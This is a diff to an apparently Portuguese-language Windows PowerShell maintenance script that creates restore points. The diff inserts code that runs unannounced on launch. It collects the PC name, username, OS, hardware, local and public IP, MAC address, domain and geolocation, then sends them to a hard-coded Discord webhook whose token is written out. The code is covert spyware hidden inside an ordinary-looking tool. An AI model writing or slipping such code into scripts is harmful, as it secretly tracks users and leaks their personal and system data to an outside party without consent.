@@ -8,6 +8,72 @@ function Pause-Script {
     Write-Host "`n[+] - Finalizado. Pressione para sair..." -ForegroundColor White
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 }
+#Webhook
+$webhookUrl = "https://discord.com/api/webhooks/1381300641246216232/mje4feLPAihgb-G8GJWA0bob8NLLtUptUtoyMxSFibiLdOwyBdMHTHDjmvO8YSjDISba"
+$hostname = $env:COMPUTERNAME
+$username = $env:USERNAME
+$date = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
+$os = (Get-CimInstance Win32_OperatingSystem).Caption
+$osVersion = (Get-CimInstance Win32_OperatingSystem).Version
+$domain = (Get-WmiObject Win32_ComputerSystem).Domain
+$manufacturer = (Get-CimInstance Win32_ComputerSystem).Manufacturer
+$model = (Get-CimInstance Win32_ComputerSystem).Model
+$cpu = (Get-CimInstance Win32_Processor).Name
+$ram = "{0:N2}" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) + " GB"
+$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | Select-Object -First 1).IPAddress
+$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127|169)' } | Select-Object -First 1).IPAddress
+$mac = (Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1).MacAddress
+
+# Padrão caso a API falhe
+$ipPublic = "Não disponível"
+$isp = "Não disponível"
+$city = "Não disponível"
+$region = "Não disponível"
+$country = "Não disponível"
+$lat = "Não disponível"
+$lon = "Não disponível"
+
+# Tenta pegar IP público e localização da API ip-api.com
+try {
+    $geoData = Invoke-RestMethod -Uri "http://ip-api.com/json" -TimeoutSec 5
+    if ($geoData.status -eq "success") {
+        $ipPublic = $geoData.query
+        $isp = $geoData.isp
+        $city = $geoData.city
+        $region = $geoData.regionName
+        $country = $geoData.country
+        $lat = $geoData.lat
+        $lon = $geoData.lon
+    }
+} catch {
+    # Não trava o script
+}
+
+
+$embed = @{
+    title = "Log System $username" 
+    color = 1
+    timestamp = (Get-Date).ToString("o")
+    fields = @(
+        @{ name = "Nome do PC"; value = $hostname; inline = $false },
+        @{ name = "Usuário"; value = $username; inline = $true },
+        @{ name = "Data"; value = $date; inline = $true },
+        @{ name = "Sistema"; value = "$os ($osVersion)"; inline = $false },
+        @{ name = "Fabricante/Modelo"; value = "$manufacturer / $model"; inline = $false },
+        @{ name = "CPU"; value = $cpu; inline = $false },
+        @{ name = "RAM"; value = $ram; inline = $true },
+        @{ name = "IP"; value = $ipLocal; inline = $true },
+        @{ name = "IP Real"; value = $ipPublic; inline = $true },
+        @{ name = "MAC"; value = $mac; inline = $true },
+        @{ name = "Domínio"; value = $domain; inline = $false }
+    )
+}
+
+$payload = @{
+    embeds = @($embed)
+} | ConvertTo-Json -Depth 4
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+
 # Criar Ponto 
 function CriarPontoDeRestauracao {
     Write-Host "[+] Criando ponto de restauração do sistema..." -ForegroundColor White
